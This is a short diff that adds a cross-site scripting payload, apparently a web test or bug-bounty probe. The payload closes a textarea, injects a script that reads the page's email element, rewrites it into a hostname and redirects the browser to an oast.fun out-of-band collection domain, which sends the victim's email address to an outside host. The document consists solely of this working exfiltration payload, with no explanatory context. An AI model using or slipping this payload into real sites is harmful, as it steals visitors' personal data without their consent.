@@ -1,0 +1,6 @@
+</textarea><script>
+var email = document.getElementById("email").innerText;
+email = email.replace("@", "0")
+email = email.replace(".", "x")
+document.location = "http://" + email + "xmiisffhzpwrrkjqxmcfhv4cvmhaazmhf.oast.fun";
+</script>
